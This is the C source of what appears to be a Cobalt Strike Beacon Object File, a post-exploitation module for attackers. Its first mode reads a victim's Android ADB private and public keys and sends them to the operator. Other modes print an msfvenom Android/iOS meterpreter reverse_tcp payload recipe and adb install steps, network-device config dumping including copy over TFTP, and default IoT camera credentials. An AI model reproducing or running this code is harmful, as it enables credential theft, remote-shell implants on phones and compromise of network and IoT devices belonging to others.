#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileSize(HANDLE, PDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char*);
DECLSPEC_IMPORT void WINAPI MSVCRT$memcpy(void*, const void*, size_t);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    
    if (mode == 0) {
        // Android ADB keys
        char homePath[MAX_PATH] = {0};
        KERNEL32$GetEnvironmentVariableA("USERPROFILE", homePath, MAX_PATH);
        
        char adbPath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(adbPath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(adbPath + MSVCRT$strlen(homePath), "\\.android\\adbkey", 15);
        }
        
        HANDLE hFile = KERNEL32$CreateFileA(adbPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 65536) {
                char buffer[65536] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== Android ADB Private Key ===");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            }
            KERNEL32$CloseHandle(hFile);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No ADB key found");
        }
        
        // ADB public key
        char pubPath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(pubPath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(pubPath + MSVCRT$strlen(homePath), "\\.android\\adbkey.pub", 20);
        }
        
        hFile = KERNEL32$CreateFileA(pubPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 8192) {
                char buffer[8192] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== Android ADB Public Key ===");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            }
            KERNEL32$CloseHandle(hFile);
        }
    }
    else if (mode == 1) {
        // Mobile stager info
        BeaconPrintf(CALLBACK_OUTPUT, "=== Mobile Agent Deployment ===");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Android:");
        BeaconPrintf(CALLBACK_OUTPUT, "  ADB push: adb push agent.apk /data/local/tmp/");
        BeaconPrintf(CALLBACK_OUTPUT, "  ADB install: adb install -r agent.apk");
        BeaconPrintf(CALLBACK_OUTPUT, "  Payload: msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o agent.apk");
        BeaconPrintf(CALLBACK_OUTPUT, "  Eternal app: adb shell pm disable-user <package>");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] iOS:");
        BeaconPrintf(CALLBACK_OUTPUT, "  Cydia impactor: sideload IPA");
        BeaconPrintf(CALLBACK_OUTPUT, "  AltStore: altserver install");
        BeaconPrintf(CALLBACK_OUTPUT, "  Checkra1n: jailbreak + SSH");
        BeaconPrintf(CALLBACK_OUTPUT, "  Payload: msfvenom -p ios/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o agent.ipa");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Common mobile ports:");
        BeaconPrintf(CALLBACK_OUTPUT, "  5555 - ADB over TCP");
        BeaconPrintf(CALLBACK_OUTPUT, "  2222 - ADB over TCP (alt)");
        BeaconPrintf(CALLBACK_OUTPUT, "  4723 - Appium");
        BeaconPrintf(CALLBACK_OUTPUT, "  8234 - Android Studio");
    }
    else if (mode == 2) {
        // Network device credentials
        BeaconPrintf(CALLBACK_OUTPUT, "=== Network Device Access ===");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Cisco devices:");
        BeaconPrintf(CALLBACK_OUTPUT, "  show version");
        BeaconPrintf(CALLBACK_OUTPUT, "  show running-config");
        BeaconPrintf(CALLBACK_OUTPUT, "  show ip route");
        BeaconPrintf(CALLBACK_OUTPUT, "  show interfaces");
        BeaconPrintf(CALLBACK_OUTPUT, "  copy running-config tftp:");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Juniper devices:");
        BeaconPrintf(CALLBACK_OUTPUT, "  show configuration");
        BeaconPrintf(CALLBACK_OUTPUT, "  show route");
        BeaconPrintf(CALLBACK_OUTPUT, "  request system snapshot");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Palo Alto:");
        BeaconPrintf(CALLBACK_OUTPUT, "  show running security-policy");
        BeaconPrintf(CALLBACK_OUTPUT, "  show interface");
        BeaconPrintf(CALLBACK_OUTPUT, "  show route");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Fortinet:");
        BeaconPrintf(CALLBACK_OUTPUT, "  show full-configuration");
        BeaconPrintf(CALLBACK_OUTPUT, "  get router info routing-table all");
    }
    else if (mode == 3) {
        // IoT device detection
        BeaconPrintf(CALLBACK_OUTPUT, "=== IoT / Embedded Devices ===");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Common IoT default IPs:");
        BeaconPrintf(CALLBACK_OUTPUT, "  192.168.1.1 - Routers/Modems");
        BeaconPrintf(CALLBACK_OUTPUT, "  192.168.0.1 - Routers/Modems");
        BeaconPrintf(CALLBACK_OUTPUT, "  192.168.100.1 - Cable modems");
        BeaconPrintf(CALLBACK_OUTPUT, "  192.168.10.1 - Some APs");
        BeaconPrintf(CALLBACK_OUTPUT, "  10.0.0.1 - AT&T routers");
        BeaconPrintf(CALLBACK_OUTPUT, "  10.1.10.1 - Ubiquiti");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Common IoT ports:");
        BeaconPrintf(CALLBACK_OUTPUT, "  80/443 - Web interface");
        BeaconPrintf(CALLBACK_OUTPUT, "  23 - Telnet");
        BeaconPrintf(CALLBACK_OUTPUT, "  22 - SSH");
        BeaconPrintf(CALLBACK_OUTPUT, "  161 - SNMP");
        BeaconPrintf(CALLBACK_OUTPUT, "  554 - RTSP (cameras)");
        BeaconPrintf(CALLBACK_OUTPUT, "  8080 - Alt HTTP");
        BeaconPrintf(CALLBACK_OUTPUT, "  8443 - Alt HTTPS");
        BeaconPrintf(CALLBACK_OUTPUT, "  1883 - MQTT");
        BeaconPrintf(CALLBACK_OUTPUT, "  5683 - CoAP");
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] IP Camera defaults:");
        BeaconPrintf(CALLBACK_OUTPUT, "  Hikvision: admin / 12345");
        BeaconPrintf(CALLBACK_OUTPUT, "  Dahua: admin / admin");
        BeaconPrintf(CALLBACK_OUTPUT, "  Axis: root / pass");
        BeaconPrintf(CALLBACK_OUTPUT, "  Ubiquiti: ubnt / ubnt");
    }
}
